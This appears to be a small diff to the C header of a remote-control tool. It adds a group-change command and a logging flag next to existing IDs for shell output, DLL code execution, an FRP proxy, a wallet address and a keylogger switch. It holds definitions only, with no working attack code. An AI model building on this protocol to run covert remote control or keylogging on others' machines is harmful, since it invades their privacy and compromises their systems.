@@ -269,6 +269,7 @@ enum {
     TOKEN_SHELL_DATA = 231,         // 终端结果
     CMD_EXECUTE_DLL = 240,			// 执行代码
     TOKEN_CLIENT_MSG = 241,         // 客户端消息
+    CMD_SET_GROUP = 242,            // 修改分组
 };
 
 enum MachineCommand {
@@ -890,7 +891,8 @@ typedef struct MasterSettings {
     int			UsingFRPProxy;				// 是否使用FRP代理
     char		WalletAddress[472];			// Wallets
     int         EnableKBLogger;             // Since 2025-11-27
-    char        Reserved[496];              // Since 2025-11-27
+    int         EnableLog;                  // Since 2025-12-17
+    char        Reserved[492];              // Since 2025-11-27
 } MasterSettings;
 
 #define MasterSettingsOldSize 500
